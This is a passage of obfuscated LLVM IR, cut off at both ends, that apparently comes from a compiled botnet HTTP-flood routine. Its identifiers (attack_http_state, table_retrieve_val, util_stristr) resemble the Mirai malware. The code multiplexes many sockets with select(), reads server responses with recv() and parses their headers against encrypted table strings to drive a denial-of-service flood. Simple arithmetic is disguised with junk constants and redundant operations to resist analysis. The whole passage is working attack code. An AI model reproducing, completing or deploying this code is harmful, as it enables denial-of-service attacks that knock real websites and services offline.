  %931 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %932 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %931, i32 0, i32 0
  %933 = load i32, i32* %932, align 4
  %934 = sdiv i32 %933, 64
  %935 = sext i32 %934 to i64
  %936 = getelementptr inbounds [16 x i64], [16 x i64]* %930, i64 0, i64 %935
  %937 = load i64, i64* %936, align 8
  %938 = and i64 %937, %929
  %939 = xor i64 %937, %929
  %940 = or i64 %938, %939
  %941 = or i64 %937, %929
  store i64 %940, i64* %936, align 8
  %942 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %943 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %942, i32 0, i32 0
  %944 = load i32, i32* %943, align 4
  %945 = load i32, i32* %23, align 4
  %946 = icmp sgt i32 %944, %945
  br i1 %946, label %947, label %956

; <label>:947:                                    ; preds = %923
  %948 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %949 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %948, i32 0, i32 0
  %950 = load i32, i32* %949, align 4
  %951 = sub i32 0, %950
  %952 = sub i32 0, 1
  %953 = add i32 %951, %952
  %954 = sub i32 0, %953
  %955 = add nsw i32 %950, 1
  store i32 %954, i32* %23, align 4
  br label %956

; <label>:956:                                    ; preds = %947, %923
  br label %1035

; <label>:957:                                    ; preds = %917
  %958 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %959 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %958, i32 0, i32 1
  %960 = load i8, i8* %959, align 4
  %961 = zext i8 %960 to i32
  %962 = icmp eq i32 %961, 10
  br i1 %962, label %963, label %1009

; <label>:963:                                    ; preds = %957
  %964 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %965 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %964, i32 0, i32 0
  %966 = load i32, i32* %965, align 4
  %967 = srem i32 %966, 64
  %968 = zext i32 %967 to i64
  %969 = shl i64 1, %968
  %970 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %971 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %972 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %971, i32 0, i32 0
  %973 = load i32, i32* %972, align 4
  %974 = sdiv i32 %973, 64
  %975 = sext i32 %974 to i64
  %976 = getelementptr inbounds [16 x i64], [16 x i64]* %970, i64 0, i64 %975
  %977 = load i64, i64* %976, align 8
  %978 = xor i64 %977, -1
  %979 = xor i64 %969, -1
  %980 = xor i64 -6056889623139871219, -1
  %981 = and i64 %978, -6056889623139871219
  %982 = and i64 %977, %980
  %983 = and i64 %979, -6056889623139871219
  %984 = and i64 %969, %980
  %985 = or i64 %981, %982
  %986 = or i64 %983, %984
  %987 = xor i64 %985, %986
  %988 = or i64 %978, %979
  %989 = xor i64 %988, -1
  %990 = or i64 -6056889623139871219, %980
  %991 = and i64 %989, %990
  %992 = or i64 %987, %991
  %993 = or i64 %977, %969
  store i64 %992, i64* %976, align 8
  %994 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %995 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %994, i32 0, i32 0
  %996 = load i32, i32* %995, align 4
  %997 = load i32, i32* %23, align 4
  %998 = icmp sgt i32 %996, %997
  br i1 %998, label %999, label %1008

; <label>:999:                                    ; preds = %963
  %1000 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1001 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1000, i32 0, i32 0
  %1002 = load i32, i32* %1001, align 4
  %1003 = sub i32 0, %1002
  %1004 = sub i32 0, 1
  %1005 = add i32 %1003, %1004
  %1006 = sub i32 0, %1005
  %1007 = add nsw i32 %1002, 1
  store i32 %1006, i32* %23, align 4
  br label %1008

; <label>:1008:                                   ; preds = %999, %963
  br label %1034

; <label>:1009:                                   ; preds = %957
  %1010 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1011 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1010, i32 0, i32 1
  %1012 = load i8, i8* %1011, align 4
  %1013 = zext i8 %1012 to i32
  %1014 = icmp eq i32 %1013, 11
  br i1 %1014, label %1015, label %1024

; <label>:1015:                                   ; preds = %1009
  %1016 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1017 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1016, i32 0, i32 1
  store i8 0, i8* %1017, align 4
  %1018 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1019 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1018, i32 0, i32 0
  %1020 = load i32, i32* %1019, align 4
  %1021 = call i32 @close(i32 %1020)
  %1022 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1023 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1022, i32 0, i32 0
  store i32 -1, i32* %1023, align 4
  br label %1033

; <label>:1024:                                   ; preds = %1009
  %1025 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1026 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1025, i32 0, i32 1
  store i8 0, i8* %1026, align 4
  %1027 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1028 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1027, i32 0, i32 0
  %1029 = load i32, i32* %1028, align 4
  %1030 = call i32 @close(i32 %1029)
  %1031 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1032 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1031, i32 0, i32 0
  store i32 -1, i32* %1032, align 4
  br label %1033

; <label>:1033:                                   ; preds = %1024, %1015
  br label %1034

; <label>:1034:                                   ; preds = %1033, %1008
  br label %1035

; <label>:1035:                                   ; preds = %1034, %956
  br label %1036

; <label>:1036:                                   ; preds = %1035, %916
  br label %1037

; <label>:1037:                                   ; preds = %1036, %877
  br label %1038

; <label>:1038:                                   ; preds = %1037, %589
  br label %1039

; <label>:1039:                                   ; preds = %1038, %519
  br label %1040

; <label>:1040:                                   ; preds = %1039, %535, %435
  %1041 = load i32, i32* %9, align 4
  %1042 = add i32 %1041, -570090072
  %1043 = add i32 %1042, 1
  %1044 = sub i32 %1043, -570090072
  %1045 = add nsw i32 %1041, 1
  store i32 %1044, i32* %9, align 4
  br label %387

; <label>:1046:                                   ; preds = %387
  %1047 = load i32, i32* %23, align 4
  %1048 = icmp eq i32 %1047, 0
  br i1 %1048, label %1049, label %1050

; <label>:1049:                                   ; preds = %1046
  br label %364

; <label>:1050:                                   ; preds = %1046
  %1051 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %1051, align 8
  %1052 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %1052, align 8
  %1053 = load i32, i32* %23, align 4
  %1054 = call i32 @select(i32 %1053, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %1054, i32* %24, align 4
  %1055 = call i64 @time(i64* null) #6
  %1056 = trunc i64 %1055 to i32
  store i32 %1056, i32* %27, align 4
  %1057 = load i32, i32* %24, align 4
  %1058 = icmp slt i32 %1057, 1
  br i1 %1058, label %1059, label %1060

; <label>:1059:                                   ; preds = %1050
  br label %364

; <label>:1060:                                   ; preds = %1050
  store i32 0, i32* %9, align 4
  br label %1061

; <label>:1061:                                   ; preds = %2782, %1060
  %1062 = load i32, i32* %9, align 4
  %1063 = load i32, i32* %18, align 4
  %1064 = icmp slt i32 %1062, %1063
  br i1 %1064, label %1065, label %2788

; <label>:1065:                                   ; preds = %1061
  %1066 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %1067 = load i32, i32* %9, align 4
  %1068 = sext i32 %1067 to i64
  %1069 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1066, i64 %1068
  store %struct.attack_http_state* %1069, %struct.attack_http_state** %26, align 8
  %1070 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1071 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1070, i32 0, i32 0
  %1072 = load i32, i32* %1071, align 4
  %1073 = icmp eq i32 %1072, -1
  br i1 %1073, label %1074, label %1075

; <label>:1074:                                   ; preds = %1065
  br label %2782

; <label>:1075:                                   ; preds = %1065
  %1076 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %1077 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1078 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1077, i32 0, i32 0
  %1079 = load i32, i32* %1078, align 4
  %1080 = sdiv i32 %1079, 64
  %1081 = sext i32 %1080 to i64
  %1082 = getelementptr inbounds [16 x i64], [16 x i64]* %1076, i64 0, i64 %1081
  %1083 = load i64, i64* %1082, align 8
  %1084 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1085 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1084, i32 0, i32 0
  %1086 = load i32, i32* %1085, align 4
  %1087 = srem i32 %1086, 64
  %1088 = zext i32 %1087 to i64
  %1089 = shl i64 1, %1088
  %1090 = xor i64 %1089, -1
  %1091 = xor i64 %1083, %1090
  %1092 = and i64 %1091, %1083
  %1093 = and i64 %1083, %1089
  %1094 = icmp ne i64 %1092, 0
  br i1 %1094, label %1095, label %1119

; <label>:1095:                                   ; preds = %1075
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1096 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1097 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1096, i32 0, i32 0
  %1098 = load i32, i32* %1097, align 4
  %1099 = bitcast i32* %35 to i8*
  %1100 = call i32 @getsockopt(i32 %1098, i32 1, i32 4, i8* %1099, i32* %36) #6
  store i32 %1100, i32* %12, align 4
  %1101 = load i32, i32* %35, align 4
  %1102 = icmp eq i32 %1101, 0
  br i1 %1102, label %1103, label %1109

; <label>:1103:                                   ; preds = %1095
  %1104 = load i32, i32* %12, align 4
  %1105 = icmp eq i32 %1104, 0
  br i1 %1105, label %1106, label %1109

; <label>:1106:                                   ; preds = %1103
  %1107 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1108 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1107, i32 0, i32 1
  store i8 4, i8* %1108, align 4
  br label %1118

; <label>:1109:                                   ; preds = %1103, %1095
  %1110 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1111 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1110, i32 0, i32 0
  %1112 = load i32, i32* %1111, align 4
  %1113 = call i32 @close(i32 %1112)
  %1114 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1115 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1114, i32 0, i32 0
  store i32 -1, i32* %1115, align 4
  %1116 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1117 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1116, i32 0, i32 1
  store i8 0, i8* %1117, align 4
  br label %2782

; <label>:1118:                                   ; preds = %1106
  br label %1119

; <label>:1119:                                   ; preds = %1118, %1075
  %1120 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1121 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1122 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1121, i32 0, i32 0
  %1123 = load i32, i32* %1122, align 4
  %1124 = sdiv i32 %1123, 64
  %1125 = sext i32 %1124 to i64
  %1126 = getelementptr inbounds [16 x i64], [16 x i64]* %1120, i64 0, i64 %1125
  %1127 = load i64, i64* %1126, align 8
  %1128 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1129 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1128, i32 0, i32 0
  %1130 = load i32, i32* %1129, align 4
  %1131 = srem i32 %1130, 64
  %1132 = zext i32 %1131 to i64
  %1133 = shl i64 1, %1132
  %1134 = xor i64 %1133, -1
  %1135 = xor i64 %1127, %1134
  %1136 = and i64 %1135, %1127
  %1137 = and i64 %1127, %1133
  %1138 = icmp ne i64 %1136, 0
  br i1 %1138, label %1139, label %2781

; <label>:1139:                                   ; preds = %1119
  %1140 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1141 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1140, i32 0, i32 1
  %1142 = load i8, i8* %1141, align 4
  %1143 = zext i8 %1142 to i32
  %1144 = icmp eq i32 %1143, 6
  br i1 %1144, label %1145, label %2297

; <label>:1145:                                   ; preds = %1139
  store i32 0, i32* %37, align 4
  %1146 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1146, i32 10240)
  %1147 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1148 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1147, i32 0, i32 0
  %1149 = load i32, i32* %1148, align 4
  %1150 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1151 = call i64 @recv(i32 %1149, i8* %1150, i64 10240, i32 16386)
  %1152 = trunc i64 %1151 to i32
  store i32 %1152, i32* %12, align 4
  %1153 = icmp slt i32 %1152, 1
  br i1 %1153, label %1154, label %1163

; <label>:1154:                                   ; preds = %1145
  %1155 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1156 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1155, i32 0, i32 0
  %1157 = load i32, i32* %1156, align 4
  %1158 = call i32 @close(i32 %1157)
  %1159 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1160 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1159, i32 0, i32 0
  store i32 -1, i32* %1160, align 4
  %1161 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1162 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1161, i32 0, i32 1
  store i8 0, i8* %1162, align 4
  br label %2782

; <label>:1163:                                   ; preds = %1145
  %1164 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1165 = load i32, i32* %12, align 4
  %1166 = call i32 @util_memsearch(i8* %1164, i32 %1165, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1167 = icmp eq i32 %1166, -1
  br i1 %1167, label %1168, label %1172

; <label>:1168:                                   ; preds = %1163
  %1169 = load i32, i32* %12, align 4
  %1170 = icmp slt i32 %1169, 10240
  br i1 %1170, label %1171, label %1172

; <label>:1171:                                   ; preds = %1168
  br label %2782

; <label>:1172:                                   ; preds = %1168, %1163
  %1173 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1174 = load i32, i32* %12, align 4
  %1175 = call i32 @util_memsearch(i8* %1173, i32 %1174, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1176 = sext i32 %1175 to i64
  %1177 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1176
  store i8 0, i8* %1177, align 1
  %1178 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1179 = load i32, i32* %12, align 4
  %1180 = call i8* @table_retrieve_val(i32 53, i32* null)
  %1181 = call i32 @util_stristr(i8* %1178, i32 %1179, i8* %1180)
  %1182 = icmp ne i32 %1181, -1
  br i1 %1182, label %1183, label %1186

; <label>:1183:                                   ; preds = %1172
  %1184 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1185 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1184, i32 0, i32 11
  store i32 2, i32* %1185, align 4
  br label %1186

; <label>:1186:                                   ; preds = %1183, %1172
  %1187 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1188 = load i32, i32* %12, align 4
  %1189 = call i8* @table_retrieve_val(i32 52, i32* null)
  %1190 = call i32 @util_stristr(i8* %1187, i32 %1188, i8* %1189)
  %1191 = icmp ne i32 %1190, -1
  br i1 %1191, label %1192, label %1195

; <label>:1192:                                   ; preds = %1186
  %1193 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1194 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1193, i32 0, i32 11
  store i32 1, i32* %1194, align 4
  br label %1195

; <label>:1195:                                   ; preds = %1192, %1186
  %1196 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1197 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1196, i32 0, i32 12
  store i32 0, i32* %1197, align 4
  %1198 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1199 = load i32, i32* %12, align 4
  %1200 = call i8* @table_retrieve_val(i32 51, i32* null)
  %1201 = call i32 @util_stristr(i8* %1198, i32 %1199, i8* %1200)
  %1202 = icmp ne i32 %1201, -1
  br i1 %1202, label %1203, label %1265

; <label>:1203:                                   ; preds = %1195
  %1204 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1205 = load i32, i32* %12, align 4
  %1206 = call i8* @table_retrieve_val(i32 51, i32* null)
  %1207 = call i32 @util_stristr(i8* %1204, i32 %1205, i8* %1206)
  store i32 %1207, i32* %38, align 4
  %1208 = load i32, i32* %38, align 4
  %1209 = sext i32 %1208 to i64
  %1210 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1209
  %1211 = load i8, i8* %1210, align 1
  %1212 = sext i8 %1211 to i32
  %1213 = icmp eq i32 %1212, 32
  br i1 %1213, label %1214, label %1221

; <label>:1214:                                   ; preds = %1203
  %1215 = load i32, i32* %38, align 4
  %1216 = sub i32 0, %1215
  %1217 = sub i32 0, 1
  %1218 = add i32 %1216, %1217
  %1219 = sub i32 0, %1218
  %1220 = add nsw i32 %1215, 1
  store i32 %1219, i32* %38, align 4
  br label %1221

; <label>:1221:                                   ; preds = %1214, %1203
  %1222 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1223 = load i32, i32* %38, align 4
  %1224 = sext i32 %1223 to i64
  %1225 = getelementptr inbounds i8, i8* %1222, i64 %1224
  %1226 = load i32, i32* %12, align 4
  %1227 = load i32, i32* %38, align 4
  %1228 = sub i32 0, %1227
  %1229 = add i32 %1226, %1228
  %1230 = sub nsw i32 %1226, %1227
  %1231 = call i32 @util_memsearch(i8* %1225, i32 %1229, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1231, i32* %39, align 4
  %1232 = load i32, i32* %39, align 4
  %1233 = icmp ne i32 %1232, -1
  br i1 %1233, label %1234, label %1264

; <label>:1234:                                   ; preds = %1221
  %1235 = load i32, i32* %38, align 4
  %1236 = sext i32 %1235 to i64
  %1237 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1236
  store i8* %1237, i8** %40, align 8
  %1238 = load i32, i32* %39, align 4
  %1239 = icmp sge i32 %1238, 2
  br i1 %1239, label %1240, label %1246

; <label>:1240:                                   ; preds = %1234
  %1241 = load i32, i32* %39, align 4
  %1242 = sub i32 %1241, -1933789223
  %1243 = sub i32 %1242, 2
  %1244 = add i32 %1243, -1933789223
  %1245 = sub nsw i32 %1241, 2
  store i32 %1244, i32* %39, align 4
  br label %1246

; <label>:1246:                                   ; preds = %1240, %1234
  %1247 = load i32, i32* %38, align 4
  %1248 = load i32, i32* %39, align 4
  %1249 = sub i32 0, %1248
  %1250 = sub i32 %1247, %1249
  %1251 = add nsw i32 %1247, %1248
  %1252 = sext i32 %1250 to i64
  %1253 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1252
  store i8 0, i8* %1253, align 1
  %1254 = load i8*, i8** %40, align 8
  %1255 = load i8*, i8** %40, align 8
  %1256 = call i32 @util_strlen(i8* %1255)
  %1257 = call i8* @table_retrieve_val(i32 50, i32* null)
  %1258 = call i32 @util_stristr(i8* %1254, i32 %1256, i8* %1257)
  %1259 = icmp ne i32 %1258, 0
  br i1 %1259, label %1260, label %1263

; <label>:1260:                                   ; preds = %1246
  %1261 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1262 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1261, i32 0, i32 12
  store i32 1, i32* %1262, align 4
  br label %1263

; <label>:1263:                                   ; preds = %1260, %1246
  br label %1264

; <label>:1264:                                   ; preds = %1263, %1221
  br label %1265

; <label>:1265:                                   ; preds = %1264, %1195
  %1266 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1267 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1266, i32 0, i32 13
  store i32 0, i32* %1267, align 4
  %1268 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1269 = load i32, i32* %12, align 4
  %1270 = call i8* @table_retrieve_val(i32 48, i32* null)
  %1271 = call i32 @util_stristr(i8* %1268, i32 %1269, i8* %1270)
  %1272 = icmp ne i32 %1271, -1
  br i1 %1272, label %1273, label %1337

; <label>:1273:                                   ; preds = %1265
  %1274 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1275 = load i32, i32* %12, align 4
  %1276 = call i8* @table_retrieve_val(i32 48, i32* null)
  %1277 = call i32 @util_stristr(i8* %1274, i32 %1275, i8* %1276)
  store i32 %1277, i32* %41, align 4
  %1278 = load i32, i32* %41, align 4
  %1279 = sext i32 %1278 to i64
  %1280 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1279
  %1281 = load i8, i8* %1280, align 1
  %1282 = sext i8 %1281 to i32
  %1283 = icmp eq i32 %1282, 32
  br i1 %1283, label %1284, label %1291

; <label>:1284:                                   ; preds = %1273
  %1285 = load i32, i32* %41, align 4
  %1286 = sub i32 0, %1285
  %1287 = sub i32 0, 1
  %1288 = add i32 %1286, %1287
  %1289 = sub i32 0, %1288
  %1290 = add nsw i32 %1285, 1
  store i32 %1289, i32* %41, align 4
  br label %1291

; <label>:1291:                                   ; preds = %1284, %1273
  %1292 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1293 = load i32, i32* %41, align 4
  %1294 = sext i32 %1293 to i64
  %1295 = getelementptr inbounds i8, i8* %1292, i64 %1294
  %1296 = load i32, i32* %12, align 4
  %1297 = load i32, i32* %41, align 4
  %1298 = add i32 %1296, -1101328220
  %1299 = sub i32 %1298, %1297
  %1300 = sub i32 %1299, -1101328220
  %1301 = sub nsw i32 %1296, %1297
  %1302 = call i32 @util_memsearch(i8* %1295, i32 %1300, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1302, i32* %42, align 4
  %1303 = load i32, i32* %42, align 4
  %1304 = icmp ne i32 %1303, -1
  br i1 %1304, label %1305, label %1336

; <label>:1305:                                   ; preds = %1291
  %1306 = load i32, i32* %41, align 4
  %1307 = sext i32 %1306 to i64
  %1308 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1307
  store i8* %1308, i8** %43, align 8
  %1309 = load i32, i32* %42, align 4
  %1310 = icmp sge i32 %1309, 2
  br i1 %1310, label %1311, label %1317

; <label>:1311:                                   ; preds = %1305
  %1312 = load i32, i32* %42, align 4
  %1313 = add i32 %1312, 1388673439
  %1314 = sub i32 %1313, 2
  %1315 = sub i32 %1314, 1388673439
  %1316 = sub nsw i32 %1312, 2
  store i32 %1315, i32* %42, align 4
  br label %1317

; <label>:1317:                                   ; preds = %1311, %1305
  %1318 = load i32, i32* %41, align 4
  %1319 = load i32, i32* %42, align 4
  %1320 = add i32 %1318, 869320565
  %1321 = add i32 %1320, %1319
  %1322 = sub i32 %1321, 869320565
  %1323 = add nsw i32 %1318, %1319
  %1324 = sext i32 %1322 to i64
  %1325 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1324
  store i8 0, i8* %1325, align 1
  %1326 = load i8*, i8** %43, align 8
  %1327 = load i8*, i8** %43, align 8
  %1328 = call i32 @util_strlen(i8* %1327)
  %1329 = call i8* @table_retrieve_val(i32 49, i32* null)
  %1330 = call i32 @util_stristr(i8* %1326, i32 %1328, i8* %1329)
  %1331 = icmp ne i32 %1330, 0
  br i1 %1331, label %1332, label %1335

; <label>:1332:                                   ; preds = %1317
  %1333 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1334 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1333, i32 0, i32 13
  store i32 1, i32* %1334, align 4
  br label %1335

; <label>:1335:                                   ; preds = %1332, %1317
  br label %1336

; <label>:1336:                                   ; preds = %1335, %1291
  br label %1337

; <label>:1337:                                   ; preds = %1336, %1265
  %1338 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1339 = load i32, i32* %12, align 4
  %1340 = call i8* @table_retrieve_val(i32 47, i32* null)
  %1341 = call i32 @util_stristr(i8* %1338, i32 %1339, i8* %1340)
  %1342 = icmp ne i32 %1341, -1
  br i1 %1342, label %1343, label %1402

; <label>:1343:                                   ; preds = %1337
  %1344 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1345 = load i32, i32* %12, align 4
  %1346 = call i8* @table_retrieve_val(i32 47, i32* null)
  %1347 = call i32 @util_stristr(i8* %1344, i32 %1345, i8* %1346)
  store i32 %1347, i32* %44, align 4
  %1348 = load i32, i32* %44, align 4
  %1349 = sext i32 %1348 to i64
  %1350 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1349
  %1351 = load i8, i8* %1350, align 1
  %1352 = sext i8 %1351 to i32
  %1353 = icmp eq i32 %1352, 32
  br i1 %1353, label %1354, label %1361

; <label>:1354:                                   ; preds = %1343
  %1355 = load i32, i32* %44, align 4
  %1356 = sub i32 0, %1355
  %1357 = sub i32 0, 1
  %1358 = add i32 %1356, %1357
  %1359 = sub i32 0, %1358
  %1360 = add nsw i32 %1355, 1
  store i32 %1359, i32* %44, align 4
  br label %1361

; <label>:1361:                                   ; preds = %1354, %1343
  %1362 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1363 = load i32, i32* %44, align 4
  %1364 = sext i32 %1363 to i64
  %1365 = getelementptr inbounds i8, i8* %1362, i64 %1364
  %1366 = load i32, i32* %12, align 4
  %1367 = load i32, i32* %44, align 4
  %1368 = sub i32 %1366, 1019876371
  %1369 = sub i32 %1368, %1367
  %1370 = add i32 %1369, 1019876371
  %1371 = sub nsw i32 %1366, %1367
  %1372 = call i32 @util_memsearch(i8* %1365, i32 %1370, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1372, i32* %45, align 4
  %1373 = load i32, i32* %45, align 4
  %1374 = icmp ne i32 %1373, -1
  br i1 %1374, label %1375, label %1401

; <label>:1375:                                   ; preds = %1361
  %1376 = load i32, i32* %44, align 4
  %1377 = sext i32 %1376 to i64
  %1378 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1377
  store i8* %1378, i8** %46, align 8
  %1379 = load i32, i32* %45, align 4
  %1380 = icmp sge i32 %1379, 2
  br i1 %1380, label %1381, label %1387

; <label>:1381:                                   ; preds = %1375
  %1382 = load i32, i32* %45, align 4
  %1383 = add i32 %1382, -171731691
  %1384 = sub i32 %1383, 2
  %1385 = sub i32 %1384, -171731691
  %1386 = sub nsw i32 %1382, 2
  store i32 %1385, i32* %45, align 4
  br label %1387

; <label>:1387:                                   ; preds = %1381, %1375
  %1388 = load i32, i32* %44, align 4
  %1389 = load i32, i32* %45, align 4
  %1390 = sub i32 0, %1388
  %1391 = sub i32 0, %1389
  %1392 = add i32 %1390, %1391
  %1393 = sub i32 0, %1392
  %1394 = add nsw i32 %1388, %1389
  %1395 = sext i32 %1393 to i64
  %1396 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1395
  store i8 0, i8* %1396, align 1
  %1397 = load i8*, i8** %46, align 8
  %1398 = call i32 @util_atoi(i8* %1397, i32 10)
  %1399 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1400 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1399, i32 0, i32 14
  store i32 %1398, i32* %1400, align 4
  br label %1401

; <label>:1401:                                   ; preds = %1387, %1361
  br label %1405

; <label>:1402:                                   ; preds = %1337
  %1403 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1403, i32 0, i32 14
  store i32 0, i32* %1404, align 4
  br label %1405

; <label>:1405:                                   ; preds = %1402, %1401
  store i32 0, i32* %37, align 4
  br label %1406

; <label>:1406:                                   ; preds = %1622, %1405
  %1407 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1408 = load i32, i32* %37, align 4
  %1409 = sext i32 %1408 to i64
  %1410 = getelementptr inbounds i8, i8* %1407, i64 %1409
  %1411 = load i32, i32* %12, align 4
  %1412 = call i8* @table_retrieve_val(i32 46, i32* null)
